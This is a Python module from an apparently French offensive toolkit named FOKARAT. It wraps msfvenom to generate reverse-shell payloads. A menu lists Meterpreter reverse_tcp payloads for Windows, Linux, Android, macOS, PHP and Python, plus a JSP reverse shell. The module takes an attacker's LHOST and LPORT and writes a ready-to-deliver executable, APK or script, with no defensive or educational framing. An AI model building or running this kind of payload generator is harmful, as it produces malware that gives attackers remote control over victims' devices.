"""FOKARAT - Générateur MSFVenom (comme TheFatRat)"""
import os
import subprocess
from core.module_interface import ModuleInterface
from core.logger import Logger
from core.utils import ask_lhost_lport, ensure_dir, which

logger = Logger()


PAYLOADS = {
    "1": ("windows/x64/meterpreter/reverse_tcp", "exe"),
    "2": ("windows/meterpreter/reverse_tcp", "exe"),
    "3": ("linux/x64/meterpreter/reverse_tcp", "elf"),
    "4": ("android/meterpreter/reverse_tcp", "apk"),
    "5": ("osx/x64/meterpreter/reverse_tcp", "macho"),
    "6": ("php/meterpreter/reverse_tcp", "raw"),
    "7": ("python/meterpreter/reverse_tcp", "raw"),
    "8": ("java/jsp_shell_reverse_tcp", "raw"),
}


class MsfvenomGenerator(ModuleInterface):
    def get_metadata(self):
        return {
            "name": "MSFVenom Payload",
            "version": "1.0",
            "type": "generator",
            "description": "Génère un payload via msfvenom (comme TheFatRat)."
        }

    def run(self, config):
        if not which("msfvenom"):
            logger.error("msfvenom n'est pas installé.")
            return {"status": "error", "message": "msfvenom manquant"}

        print("\n  Choisissez le type de payload :")
        for k, (p, fmt) in PAYLOADS.items():
            print(f"    [{k}] {p}  ->  .{fmt}")
        choice = input("  [>] Choix : ").strip()

        if choice not in PAYLOADS:
            logger.error("Choix invalide.")
            return {"status": "error", "message": "Choix invalide"}

        payload, fmt = PAYLOADS[choice]
        lhost, lport = ask_lhost_lport(config)

        out_dir = ensure_dir(config.get("output_dir", "output"))
        out_file = os.path.join(out_dir, f"fokarat_payload.{fmt}")

        cmd = ["msfvenom", "-p", payload, f"LHOST={lhost}", f"LPORT={lport}", "-f", fmt, "-o", out_file]
        logger.info(f"Commande : {' '.join(cmd)}")

        try:
            subprocess.run(cmd, check=True)
            if os.path.exists(out_file):
                logger.success(f"Payload généré : {out_file}")
                return {"status": "success", "payload_path": out_file, "type": "msfvenom"}
            return {"status": "error", "message": "Fichier non généré"}
        except subprocess.CalledProcessError as e:
            logger.error(f"msfvenom échoué : {e}")
            return {"status": "error", "message": str(e)}